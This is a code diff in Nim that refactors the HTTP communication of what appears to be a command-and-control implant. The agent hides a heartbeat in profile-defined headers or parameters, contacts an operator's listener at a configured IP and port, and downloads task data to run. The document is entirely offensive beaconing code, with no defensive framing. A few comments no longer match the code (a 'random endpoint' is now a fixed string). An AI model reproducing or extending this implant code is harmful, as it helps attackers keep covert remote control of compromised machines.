@@ -13,18 +13,28 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
         heartbeatString = encode(heartbeat, safe = ctx.profile.getBool("http-get.agent.heartbeat.encoding.url-safe")).replace("=", "")
     of "none": 
         heartbeatString = Bytes.toString(heartbeat)
-    
-    let prefix = ctx.profile.getString("http-get.agent.heartbeat.prefix")
-    let suffix = ctx.profile.getString("http-get.agent.heartbeat.suffix")
 
-    let payload = prefix & heartbeatString & suffix
+    # Define request headers, as defined in profile
+    for header, value in ctx.profile.getTable("http-get.agent.headers"): 
+        client.headers.add(header, value.getStringValue())
+
+    # Select a random endpoint to make the request to
+    var endpoint = ctx.profile.getString("http-get.endpoints")
+    if endpoint[0] == '/': 
+        endpoint = endpoint[1..^1] & "?"    # Add '?' for additional GET parameters
+
+    let 
+        prefix = ctx.profile.getString("http-get.agent.heartbeat.prefix")
+        suffix = ctx.profile.getString("http-get.agent.heartbeat.suffix")
+        payload = prefix & heartbeatString & suffix
 
     # Add heartbeat packet to the request
     case ctx.profile.getString("http-get.agent.heartbeat.placement.type"): 
     of "header": 
         client.headers.add(ctx.profile.getString("http-get.agent.heartbeat.placement.name"), payload)
     of "parameter":
-        discard 
+        let param = ctx.profile.getString("http-get.agent.heartbeat.placement.name")
+        endpoint &= fmt"{param}={payload}&"
     of "uri":
         discard
     of "body": 
@@ -32,24 +42,13 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
     else:
         discard 
 
-    # Define request headers, as defined in profile
-    for header, value in ctx.profile.getTable("http-get.agent.headers"): 
-        client.headers.add(header, value.getStringValue())
-
     # Define additional request parameters
-    var params = ""
     for param, value in ctx.profile.getTable("http-get.agent.parameters"): 
-        params &= fmt"&{param}={value.getStringValue()}"
-    params[0] = '?'
-
-    # Select a random endpoint to make the request to
-    var endpoint = ctx.profile.getArray("http-get.endpoints").getRandom().getStringValue()
-    if endpoint[0] == '/': 
-        endpoint = endpoint[1..^1]
+        endpoint &= fmt"{param}={value.getStringValue()}&"
 
     try:
         # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
-        return waitFor client.getContent(fmt"http://{ctx.ip}:{$ctx.port}/{endpoint}{params}")
+        return waitFor client.getContent(fmt"http://{ctx.ip}:{$ctx.port}/{endpoint[0..^2]}")
     
     except CatchableError as err:
         # When the listener is not reachable, don't kill the application, but check in at the next time
@@ -69,11 +68,11 @@ proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} =
         client.headers.add(header, value.getStringValue())
     
     # Select a random endpoint to make the request to
-    var endpoint = ctx.profile.getArray("http-post.endpoints").getRandom().getStringValue()
+    var endpoint = ctx.profile.getString("http-post.endpoints")
     if endpoint[0] == '/': 
         endpoint = endpoint[1..^1]
     
-    let requestMethod = parseEnum[HttpMethod](ctx.profile.getArray("http-post.request-methods").getRandom().getStringValue("POST"))
+    let requestMethod = parseEnum[HttpMethod](ctx.profile.getString("http-post.request-methods", "POST"))
 
     let body = Bytes.toString(data)
 
